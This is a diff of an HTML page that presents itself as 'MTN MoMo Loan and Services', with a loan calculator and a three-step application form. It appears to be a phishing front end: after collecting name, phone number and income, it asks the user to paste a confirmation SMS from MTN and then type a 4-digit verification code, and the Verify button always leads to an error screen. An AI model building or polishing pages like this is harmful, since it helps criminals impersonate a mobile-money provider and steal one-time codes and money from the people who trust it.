@@ -8,7 +8,7 @@
 </head>
 <body>
 
-    <!-- Screen 1: Language Selection (Dark Theme) -->
+    <!-- Screen 1: Language Selection -->
     <div id="language-screen" class="dark-screen active">
         <div class="dark-card">
             <div class="logo-container">
@@ -24,28 +24,17 @@
             <div class="lang-options">
                 <div class="lang-option" onclick="selectLanguage()">
                     <img src="https://flagcdn.com/w40/gb.png" alt="English Flag">
-                    <div class="lang-text">
-                        <strong>English</strong>
-                        <span>Continue in English</span>
-                    </div>
+                    <div class="lang-text"><strong>English</strong><span>Continue in English</span></div>
                     <div class="radio-circle"></div>
                 </div>
-
                 <div class="lang-option" onclick="selectLanguage()">
                     <img src="https://flagcdn.com/w40/fr.png" alt="French Flag">
-                    <div class="lang-text">
-                        <strong>Français</strong>
-                        <span>Continuer en français</span>
-                    </div>
+                    <div class="lang-text"><strong>Français</strong><span>Continuer en français</span></div>
                     <div class="radio-circle"></div>
                 </div>
-
                 <div class="lang-option selected" onclick="selectLanguage()">
                     <img src="https://flagcdn.com/w40/cm.png" alt="Cameroon Flag">
-                    <div class="lang-text">
-                        <strong>Camfranglais</strong>
-                        <span>Continue in Camfranglais</span>
-                    </div>
+                    <div class="lang-text"><strong>Camfranglais</strong><span>Continue in Camfranglais</span></div>
                     <div class="radio-circle"></div>
                 </div>
             </div>
@@ -53,10 +42,9 @@
         </div>
     </div>
 
-    <!-- Screen 2: Main Calculator (New Dark Theme) -->
+    <!-- Screen 2: Main Calculator -->
     <div id="main-screen" class="dark-screen">
         <div class="calculator-container">
-            
             <div class="calc-header">
                 <h1>Welcome to MTN MoMo Loan and Services</h1>
                 <p>Get loans easily through MTN MoMo Loan and Services</p>
@@ -65,19 +53,14 @@
             <div class="calc-card">
                 <h2 class="calc-title">Loan Calculator</h2>
 
-                <!-- Amount Slider -->
                 <div class="slider-group">
                     <div class="slider-labels">
                         <span>Amount: <strong class="highlight-yellow" id="amountDisplay">XAF 410,000</strong></span>
                     </div>
                     <input type="range" id="loanAmount" min="10000" max="1000000" step="10000" value="410000" oninput="updateLoanValue()">
-                    <div class="range-limits">
-                        <span>XAF 10,000</span>
-                        <span>XAF 1,000,000</span>
-                    </div>
+                    <div class="range-limits"><span>XAF 10,000</span><span>XAF 1,000,000</span></div>
                 </div>
 
-                <!-- Term Slider -->
                 <div class="slider-group">
                     <div class="slider-labels">
                         <span>Term: <strong class="highlight-yellow" id="termDisplay">12 Months</strong></span>
@@ -85,54 +68,95 @@
                     <input type="range" id="loanTerm" min="3" max="36" step="1" value="12" oninput="updateLoanValue()">
                 </div>
 
-                <!-- Result Box -->
                 <div class="result-box">
                     <p>Monthly Payment</p>
                     <h2 class="highlight-yellow" id="monthlyPayment">XAF 38,267</h2>
                 </div>
 
-                <!-- Start Button -->
-                <button class="btn-primary" onclick="showScreen('form-screen')">START APPLICATION</button>
+                <!-- Clicking this saves values and goes to form -->
+                <button class="btn-primary" onclick="goToForm()">START APPLICATION</button>
             </div>
         </div>
     </div>
 
-    <!-- Screen 3: Multi-step Form -->
+    <!-- Screen 3: Loan Details Form (Updated to match screenshot) -->
     <div id="form-screen" class="dark-screen">
-        <div class="dark-card">
-            <div class="progress-bar">
-                <p id="step-indicator">Step 1 of 3</p>
+        <div class="calculator-container">
+            
+            <!-- Progress Bar -->
+            <div class="progress-container">
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill" id="progress-fill"></div>
+                </div>
+                <p class="step-text" id="step-indicator">Step 1 of 3</p>
             </div>
 
-            <div id="form-container">
-                <!-- Step 1 -->
+            <div class="calc-card form-card">
+                
+                <!-- Step 1: Loan Details -->
                 <div id="step-1" class="form-step active">
-                    <h4>Loan Details</h4>
-                    <label>Loan Purpose:</label>
-                    <select>
-                        <option>Business</option>
-                        <option>Personal</option>
-                        <option>Education</option>
-                    </select>
-                    <button class="btn-primary" onclick="nextStep(2)">Next</button>
+                    <h2 class="step-title">Loan Details</h2>
+
+                    <div class="input-group">
+                        <label>Loan Type</label>
+                        <select class="dark-input">
+                            <option>Business Loan</option>
+                            <option>Personal Loan</option>
+                            <option>Emergency Loan</option>
+                        </select>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Loan Amount (XAF)</label>
+                        <!-- Readonly means the user cannot change it here, it comes from calculator -->
+                        <input type="text" id="formLoanAmount" class="dark-input" readonly>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Loan Term</label>
+                        <input type="text" id="formLoanTerm" class="dark-input" readonly>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Purpose of Loan</label>
+                        <input type="text" placeholder="e.g., Business expansion" class="dark-input">
+                    </div>
+
+                    <button class="btn-primary" onclick="nextStep(2)">NEXT STEP</button>
                 </div>
 
-                <!-- Step 2 -->
+                <!-- Step 2: Personal Details -->
                 <div id="step-2" class="form-step">
-                    <h4>Personal Details</h4>
-                    <label>Full Name:</label>
-                    <input type="text" placeholder="John Doe">
-                    <label>Phone Number:</label>
-                    <input type="tel" placeholder="6XXXXXXXX">
-                    <button class="btn-primary" onclick="nextStep(3)">Next</button>
+                    <h2 class="step-title">Personal Details</h2>
+                    
+                    <div class="input-group">
+                        <label>Full Name</label>
+                        <input type="text" placeholder="John Doe" class="dark-input">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Phone Number</label>
+                        <input type="tel" placeholder="6XXXXXXXX" class="dark-input">
+                    </div>
+
+                    <button class="btn-primary" onclick="nextStep(3)">NEXT STEP</button>
                 </div>
 
-                <!-- Step 3 -->
+                <!-- Step 3: Employment Details -->
                 <div id="step-3" class="form-step">
-                    <h4>Employment Details</h4>
-                    <label>Occupation:</label>
-                    <input type="text" placeholder="Enter occupation">
-                    <button class="btn-primary" onclick="submitApplication()">Submit Application</button>
+                    <h2 class="step-title">Employment Details</h2>
+                    
+                    <div class="input-group">
+                        <label>Occupation</label>
+                        <input type="text" placeholder="Enter occupation" class="dark-input">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Monthly Income (XAF)</label>
+                        <input type="text" placeholder="e.g. 150000" class="dark-input">
+                    </div>
+
+                    <button class="btn-primary" onclick="submitApplication()">SUBMIT APPLICATION</button>
                 </div>
             </div>
         </div>
@@ -152,7 +176,7 @@
         <div class="dark-card" style="text-align:center;">
             <h2 class="dark-title">Paste the SMS from MTN</h2>
             <p class="dark-subtitle">We sent a confirmation message to your number. Copy the full SMS you received and paste it below.</p>
-            <textarea placeholder="Paste SMS here..."></textarea>
+            <textarea class="dark-input" placeholder="Paste SMS here..."></textarea>
             <button class="btn-primary" onclick="showScreen('verification-screen')">Next</button>
         </div>
     </div>
@@ -162,7 +186,7 @@
         <div class="dark-card" style="text-align:center;">
             <h2 class="dark-title">Enter the Verification Code</h2>
             <p class="dark-subtitle">We sent a 4-digit code to your number. Enter it below to continue.</p>
-            <input type="text" maxlength="4" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
+            <input type="text" maxlength="4" class="dark-input" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
             <button class="btn-primary" onclick="showScreen('error-screen')">Verify</button>
         </div>
     </div>
